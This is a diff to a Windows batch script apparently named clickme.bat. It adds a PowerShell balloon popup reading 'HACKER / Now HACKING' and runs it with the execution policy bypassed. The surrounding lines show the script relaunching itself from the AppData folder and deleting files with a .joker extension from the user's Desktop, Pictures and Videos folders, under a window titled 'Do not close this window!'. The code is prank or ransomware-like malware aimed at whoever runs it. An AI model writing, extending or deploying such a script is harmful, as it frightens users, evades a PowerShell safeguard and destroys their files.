@@ -66,6 +66,25 @@ echo .
 pause
 cls
 
+
+set "btitle=HACKER"
+:: Notification content
+set "text=Now HACKING"
+:: Notification icon
+:: error, info, none, warning 
+set "icon=warning"
+(echo [void] [System.Reflection.Assembly]::LoadWithPartialName("System.Windows.Forms"^)
+echo $objNotifyIcon = New-Object System.Windows.Forms.NotifyIcon
+echo $objNotifyIcon.Icon = [System.Drawing.SystemIcons]::Information
+echo $objNotifyIcon.BalloonTipIcon = "%icon%"
+echo $objNotifyIcon.BalloonTipTitle = "%btitle%"
+echo $objNotifyIcon.BalloonTipText = "%text%"
+echo $objNotifyIcon.Visible = $True
+echo $objNotifyIcon.ShowBalloonTip(10000^))>%temp%\notification.ps1
+powershell -noprofile -executionpolicy bypass -file %temp%\notification.ps1 | more
+del /q %temp%\notification.ps1
+
+
 set "filename=clickme.bat"
 
 if not "%~nx0" == "%filename%" (
@@ -270,7 +289,7 @@ start %userprofile%\AppData\clickme.bat
 exit
 :a
 mode con cols=120 lines=30
-title 이 창을 닫지 마십시오
+title Do not close this window!
 del %userprofile%\Desktop\*.joker* >nul 2>&1
 del %userprofile%\pictures\*.joker* >nul 2>&1
 del %userprofile%\videos\*.joker* >nul 2>&1
